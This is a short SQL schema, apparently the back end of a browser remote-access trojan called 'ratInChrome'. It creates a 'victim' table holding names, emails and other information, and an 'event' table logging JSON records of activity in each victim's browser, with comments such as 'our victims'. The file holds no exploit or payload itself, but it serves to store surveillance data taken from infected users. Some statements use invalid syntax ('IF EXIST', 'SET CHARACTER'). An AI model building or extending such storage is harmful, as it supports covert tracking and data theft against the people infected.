DROP DATABASE IF EXIST `ratInChrome`;
CREATE DATABASE `ratInChrome` SET CHARACTER utf8;

-- our victims
CREATE TABLE `victim` (
	id INT PRIMARY KEY AUTO_INCREMENT,
	name VARCHAR(100),
	email VARCHAR(100) null,
	info TEXT null
);

-- some events in victim browser
-- info field must be in json format
-- without foreign key! (we really need to do like this)
CREATE TABLE `event` (
	id INT PRIMARY KEY AUTO_INCREMENT,
	victim_id INT NOT NULL,
	info TEXT NOT NULL,
	event_time TIMESTAMP NULL
);